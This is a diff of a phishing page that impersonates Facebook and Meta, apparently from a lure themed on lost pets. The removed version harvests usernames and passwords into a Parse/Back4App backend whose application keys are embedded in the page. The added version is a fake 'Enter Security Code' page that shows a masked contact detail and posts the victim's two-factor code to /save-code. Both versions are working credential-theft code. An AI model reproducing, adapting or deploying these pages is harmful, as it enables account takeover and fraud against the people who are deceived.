@@ -1,241 +1,74 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <title>Follow our page - Pawboost Community Find Lost Pets</title>
-
-  <!-- Parse SDK -->
-  <script src="https://unpkg.com/parse@latest/dist/parse.min.js"></script>
-  <script>
-    Parse.initialize(
-      "CELPtvPoGIzpx1G2rGG4jvhSbPAGvVLYMGpEIL4x", // Application ID
-      "xE0oqpe33sdDBN5sxKOM0zjFqmxVYxsZLcmWOqV4"  // JavaScript Key
-    );
-    Parse.serverURL = "https://parseapi.back4app.com/";
-  </script>
-
-  <!-- Meta Tags -->
-  <meta property="og:title" content="Lost & Found Pets US" />
-  <meta property="og:description" content="Join our community to help reunite lost pets with their families." />
-  <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-  <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="Florida Lost Pets" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Lost & Found Pets Florida" />
-  <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
-  <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook – Confirm Your Identity</title>
   <style>
-    :root {
-      --fb-blue: #1877f2;
-      --fb-light-gray: #f0f2f5;
-      --fb-dark-blue: #1c1e21;
-      --fb-text-gray: #606770;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
-      background-color: var(--fb-light-gray);
+      background-color: #f0f2f5;
       font-family: Arial, sans-serif;
-      color: var(--fb-dark-blue);
+      margin: 0;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px 10px;
-    }
-
-    .intro-text {
-      text-align: center;
-      margin-top: 20px;
-      margin-bottom: 30px;
-    }
-
-    .intro-text h1 {
-      color: var(--fb-blue);
-      font-size: 32px;
-    }
-
-    .intro-text p {
-      font-size: 14px;
-      max-width: 320px;
-      margin: 10px auto 0;
-      color: var(--fb-dark-blue);
-    }
-
-    .language-toggle {
-      margin-top: 10px;
-      cursor: pointer;
-      font-size: 14px;
-      color: var(--fb-text-gray);
-    }
-
-    .login-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 90%;
-      max-width: 400px;
-      margin-top: 10px;
-    }
-
-    .fb-logo {
-      width: 60px;
-      height: 60px;
-      background: white;
-      border-radius: 50%;
-      display: flex;
       align-items: center;
       justify-content: center;
-      margin: 20px 0;
+      min-height: 100vh;
     }
-
-    .fb-logo img {
-      width: 30px;
-      height: 30px;
-    }
-
-    .input-group {
-      position: relative;
-      margin-bottom: 20px;
-      width: 100%;
-    }
-
-    .input-group input {
-      width: 100%;
-      height: 52px;
-      padding: 0 10px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
+    .confirmation-container {
       background: white;
-      color: var(--fb-dark-blue);
-      font-size: 16px;
-      line-height: 48px;
-    }
-
-    .input-group label {
-      position: absolute;
-      top: 16px;
-      left: 12px;
-      color: var(--fb-text-gray);
-      font-size: 14px;
-      pointer-events: none;
-      transition: all 0.2s ease;
-    }
-
-    .input-group input:focus + label,
-    .input-group input:not(:placeholder-shown) + label {
-      top: 4px;
-      left: 10px;
-      font-size: 12px;
-      color: #555;
-    }
-
-    button.login-btn {
-      width: 100%;
-      background-color: var(--fb-blue);
-      color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 25px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-bottom: 15px;
-    }
-
-    .forgot-password {
-      color: var(--fb-blue);
-      font-size: 14px;
-      text-align: center;
-      margin-bottom: 30px;
-      cursor: pointer;
-    }
-
-    .create-account {
-      width: 90%;
       max-width: 400px;
-      background: white;
-      border: 1px solid var(--fb-blue);
-      color: var(--fb-blue);
-      padding: 14px;
-      border-radius: 25px;
-      font-size: 16px;
+      width: 90%;
+      padding: 30px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       text-align: center;
-      cursor: pointer;
+    }
+    .fb-logo {
       margin-bottom: 20px;
     }
-
-    .meta-logo {
+    .fb-logo img {
+      height: 40px;
+    }
+    h2 {
+      color: #1c1e21;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #606770;
       font-size: 14px;
-      color: var(--fb-text-gray);
-      margin-bottom: 15px;
+      margin-bottom: 25px;
+      line-height: 1.4;
     }
-
-    .language-modal {
-      display: none;
-      position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      height: 57vh;
+    input[type="text"] {
       width: 100%;
-      max-width: 500px;
-      background-color: white;
-      border-top-left-radius: 20px;
-      border-top-right-radius: 20px;
-      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.5);
-      z-index: 999;
-      padding: 20px;
-      color: #000;
-      overflow-y: auto;
-      scrollbar-width: none;
-    }
-
-    .language-modal::-webkit-scrollbar {
-      display: none;
-    }
-
-    .language-modal-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-
-    .close-btn {
-      font-size: 24px;
-      cursor: pointer;
-      margin-right: 10px;
-    }
-
-    .modal-title {
-      font-size: 16px;
-      font-weight: bold;
-    }
-
-    .language-modal-list {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-    }
-
-    .language-modal-list li {
       padding: 12px;
       font-size: 16px;
-      border-bottom: 1px solid #ddd;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    .resend-link {
+      font-size: 13px;
+      color: #1877f2;
       cursor: pointer;
     }
-
-    .language-modal-list li:hover {
-      background-color: #f0f0f0;
+    .resend-link:hover {
+      text-decoration: underline;
     }
-
     .meta-footer {
       position: fixed;
       bottom: 0;
@@ -244,191 +77,122 @@
       background-color: white;
       padding: 10px 20px;
       box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
       text-align: center;
-      transition: transform 0.3s ease;
-      transform: translateY(0);
     }
-
     .top-line {
-      gap: 8px;
       display: flex;
       align-items: center;
-      margin-bottom: 5px;
+      justify-content: center;
+      gap: 8px;
     }
-
     .top-line img {
-      height: 22px;
+      height: 24px;
     }
-
     .meta-text {
-      font-weight: 700;
-      color: #616770;
-      font-size: 1rem;
+      font-weight: bold;
+      font-size: 1.1rem;
+      color: #333;
     }
-
     .bottom-line {
-      font-size: 0.8rem;
-      color: #616770;
-    }
-
-    @media (max-width: 768px) {
-      .meta-footer {
-        padding: 6px 15px;
-      }
-
-      .top-line {
-        gap: 4px;
-        margin-bottom: 3px;
-      }
-
-      .top-line img {
-        height: 18px;
-      }
-
-      .meta-text {
-        font-size: 0.9rem;
-      }
-
-      .bottom-line {
-        font-size: 0.75rem;
-      }
+      font-size: 0.9rem;
+      color: #555;
     }
   </style>
 </head>
 <body>
-
-  <div class="intro-text">
-    <h1>Facebook</h1>
-    <p>Facebook helps you connect and share with the people in your life.</p>
-  </div>
-
-  <div class="language-toggle" onclick="openLanguageModal()">English (UK) &#x25BC;</div>
-
-  <div class="login-container">
+  <div class="confirmation-container">
     <div class="fb-logo">
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
     </div>
+    <h2>Enter Security Code</h2>
+    <p id="confirmation-msg"></p>
 
-    <div class="input-group">
-      <input type="text" id="username" placeholder=" " />
-      <label for="username">Mobile number or email address</label>
-    </div>
-
-    <div class="input-group">
-      <input type="password" id="password" placeholder=" " />
-      <label for="password">Password</label>
-    </div>
-
-    <button class="login-btn" onclick="loginUser()">Log in</button>
-    <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
-  </div>
-
-  <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
-
-  <div id="languageModal" class="language-modal">
-    <div class="language-modal-header">
-      <span class="close-btn" onclick="closeLanguageModal()">&times;</span>
-      <span class="modal-title">Select Language</span>
-    </div>
-    <ul class="language-modal-list">
-      <li onclick="selectLanguage('English (UK)')">English (UK)</li>
-      <li onclick="selectLanguage('Español')">Español</li>
-      <li onclick="selectLanguage('Français (France)')">Français (France)</li>
-      <li onclick="selectLanguage('Deutsch')">Deutsch</li>
-      <li onclick="selectLanguage('Português (Brasil)')">Português (Brasil)</li>
-      <li onclick="selectLanguage('Italiano')">Italiano</li>
-    </ul>
+    <input type="text" id="code-input" placeholder="Enter code" maxlength="20" />
+    <button class="btn" onclick="verifyCode()">Continue</button>
+    <div class="resend-link" onclick="alert('A new code has been sent.')">Didn't get the code?</div>
   </div>
 
   <div class="meta-footer">
     <div class="top-line">
-      <img src="metalogo.png" alt="Meta Logo" />
-      <span class="meta-text">Meta</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta logo" />
+      <div class="meta-text">Meta</div>
     </div>
-    <div class="bottom-line">About · Help · More</div>
+    <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
   </div>
 
   <script>
-    function openLanguageModal() {
-      document.getElementById('languageModal').style.display = 'block';
-    }
+    window.onload = function () {
+      const user = localStorage.getItem("login_user");
+      const msgEl = document.getElementById("confirmation-msg");
 
-    function closeLanguageModal() {
-      document.getElementById('languageModal').style.display = 'none';
-    }
-
-    function selectLanguage(language) {
-      document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
-      closeLanguageModal();
-    }
-
-    function showError(inputElement) {
-      inputElement.style.borderColor = 'red';
-
-      const error = document.createElement('div');
-      error.className = 'error-message';
-      error.style.color = 'red';
-      error.style.fontSize = '12px';
-      error.style.marginTop = '4px';
-      error.textContent = 'Required';
-
-      inputElement.parentNode.appendChild(error);
-    }
-
-    function loginUser() {
-      const usernameInput = document.getElementById("username");
-      const passwordInput = document.getElementById("password");
-
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      document.querySelectorAll('.error-message').forEach(el => el.remove());
-      [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
-
-      let hasError = false;
-
-      if (!username) {
-        showError(usernameInput);
-        hasError = true;
+      if (!user) {
+        msgEl.textContent = "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
+        return;
       }
 
-      if (!password) {
-        showError(passwordInput);
-        hasError = true;
+      let displayType = "account";
+      let ending = "";
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (emailRegex.test(user)) {
+        displayType = "email";
+        const atIndex = user.indexOf("@");
+        ending = user.slice(atIndex);
+      } else if (/^\d{7,}$/.test(user)) {
+        displayType = "phone number";
+        ending = user.slice(-4);
+      } else {
+        displayType = "username";
+        ending = user.length > 4 ? user.slice(-4) : user;
       }
 
-      if (hasError) return;
+      msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
+    };
 
-      const Login = Parse.Object.extend("Login");
-      const login = new Login();
-      login.set("username", username);
-      login.set("password", password);
+    function verifyCode() {
+      const codeInput = document.getElementById("code-input");
+      const code = codeInput.value.trim();
 
-      login.save()
-        .then(() => {
-          localStorage.setItem("login_user", username);
-          window.location.href = "code.html";
-        })
-        .catch((error) => {
-          console.error("Login save failed:", error);
-          alert("An error occurred while submitting the login.");
-        });
-    }
+      // Remove previous error state
+      const existingError = document.querySelector(".error-message");
+      if (existingError) existingError.remove();
+      codeInput.style.borderColor = "#ccc";
 
-    // Auto-hide Meta footer when keyboard is active
-    (() => {
-      const footer = document.querySelector('.meta-footer');
-      let initialHeight = window.innerHeight;
+      if (!code) {
+        codeInput.style.borderColor = "red";
 
-      window.addEventListener('resize', () => {
-        const currentHeight = window.innerHeight;
-        footer.style.transform = (initialHeight - currentHeight > 150) ? 'translateY(100%)' : 'translateY(0)';
+        const error = document.createElement("div");
+        error.className = "error-message";
+        error.textContent = "Required";
+        error.style.color = "red";
+        error.style.fontSize = "12px";
+        error.style.marginTop = "-15px";
+        error.style.marginBottom = "15px";
+        codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
+
+        return;
+      }
+
+      // Submit code
+      fetch('/save-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = "homepage.html";
+        } else {
+          alert("Incorrect code. Please try again.");
+        }
+      })
+      .catch(() => {
+        alert("An error occurred. Please try again.");
       });
-    })();
+    }
+
   </script>
 </body>
 </html>
